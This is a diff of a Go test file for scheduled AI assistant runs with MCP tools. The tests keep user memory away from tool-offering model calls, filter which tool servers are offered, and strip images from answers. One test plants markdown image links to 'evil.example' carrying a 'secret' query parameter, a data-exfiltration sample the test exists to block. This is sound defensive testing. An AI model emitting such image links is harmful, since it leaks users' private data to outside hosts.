@@ -187,8 +187,8 @@ func TestScheduledRunGetsTheUsersMCPServersAndMemory(t *testing.T) {
 	}
 	client := &fakeToolChatClient{Results: []llm.StreamResult{
 		{ToolCalls: []llm.ToolCall{{ID: "c1", Type: "function", Function: llm.ToolCallFunction{Name: "peeq__search", Arguments: `{"query":"agents","channel":"AI Engineer"}`}}}},
-		{Content: "Nothing new."},
-	}}
+		{Content: "One new talk, written without the memory."},
+	}, Plain: "One new talk on agents in banks [1]."}
 	var called []string
 	deps := f.deps
 	deps.LLM = client
@@ -210,13 +210,86 @@ func TestScheduledRunGetsTheUsersMCPServersAndMemory(t *testing.T) {
 		t.Fatalf("called = %v, want the user's peeq search", called)
 	}
 	system := client.Histories[0][0].Content
-	for _, want := range []string{"platform engineer at a bank", "Search the AI Engineer channel unprompted."} {
-		if !strings.Contains(system, want) {
-			t.Fatalf("the run's system prompt lacks %q:\n%s", want, system)
-		}
+	if !strings.Contains(system, "Search the AI Engineer channel unprompted.") {
+		t.Fatalf("the run's system prompt lacks peeq's guidance:\n%s", system)
 	}
 	if strings.Contains(system, "create_pdf_file") {
 		t.Fatalf("the run's system prompt guides file tools it does not have:\n%s", system)
+	}
+	// The memory never reaches a call that offers tools, only the last,
+	// tool-free one that writes the answer.
+	last := len(client.Histories) - 1
+	for i, history := range client.Histories {
+		hasMemory := strings.Contains(history[0].Content, "platform engineer at a bank")
+		if len(client.Tools[i]) > 0 && hasMemory {
+			t.Fatalf("call %d offers tools and carries the memory", i)
+		}
+		if i == last && (len(client.Tools[i]) > 0 || !hasMemory) {
+			t.Fatalf("the last call (tools %d, memory %v) is not the tool-free one with the memory", len(client.Tools[i]), hasMemory)
+		}
+	}
+	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
+	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
+	if answer := messages[len(messages)-1].Content; answer != "One new talk on agents in banks [1]." {
+		t.Fatalf("answer = %q, want the tool-free call's", answer)
+	}
+}
+
+func TestScheduledRunWithoutMemoryKeepsItsAnswer(t *testing.T) {
+	ctx := context.Background()
+	f := newScheduleFixture(t)
+	client := &fakeToolChatClient{Results: researchRound("Nothing new.")}
+	s := newRunnerServer(t, f, client)
+	s.runSchedule(ctx, newRunnerSchedule(t, f))
+	if len(client.Histories) != 2 {
+		t.Fatalf("model calls = %d, want the research round and its answer only", len(client.Histories))
+	}
+}
+
+func TestScheduledAnswerDropsImages(t *testing.T) {
+	ctx := context.Background()
+	f := newScheduleFixture(t)
+	client := &fakeToolChatClient{Results: researchRound(
+		"New: a talk ![poster](https://evil.example/p.png?d=secret) and ![![x](y)](https://evil.example/?d=nested), see [the page](https://arena.ch/programm).")}
+	s := newRunnerServer(t, f, client)
+	sch := newRunnerSchedule(t, f)
+	s.runSchedule(ctx, sch)
+	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
+	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
+	answer := messages[len(messages)-1]
+	if strings.Contains(answer.Content, "![") || strings.Contains(answer.Content, "evil.example") {
+		t.Fatalf("answer still loads an image: %q", answer.Content)
+	}
+	if !strings.Contains(answer.Content, "a talk poster and") || !strings.Contains(answer.Content, "[the page](https://arena.ch/programm)") {
+		t.Fatalf("answer lost its text or link: %q", answer.Content)
+	}
+	if strings.Contains(string(answer.ContentBlocks), "evil.example") {
+		t.Fatalf("the answer's blocks still load an image: %s", answer.ContentBlocks)
+	}
+}
+
+func TestScheduledRunOffersCategoryServersOnlyWhenTheyFit(t *testing.T) {
+	for _, c := range []struct {
+		category string
+		context7 bool
+	}{{"recent_news", false}, {"coding", true}} {
+		t.Run(c.category, func(t *testing.T) {
+			ctx := context.Background()
+			f := newScheduleFixture(t)
+			client := &fakeToolChatClient{Results: researchRound("Nothing new."), ClassifyResult: c.category}
+			deps := f.deps
+			deps.LLM = client
+			deps.MCP = &fakeMCPService{ToolList: peeqTools(), ToolCategories: map[string][]string{"context7__docs": {"coding"}}, Result: "page"}
+			s := newServer(deps)
+			s.runSchedule(ctx, newRunnerSchedule(t, f))
+			offered := map[string]bool{}
+			for _, tool := range client.Tools[0] {
+				offered[tool.Function.Name] = true
+			}
+			if offered["context7__docs"] != c.context7 || !offered["peeq__search"] || !offered["fetch__fetch"] {
+				t.Fatalf("offered = %v", offered)
+			}
+		})
 	}
 }
 
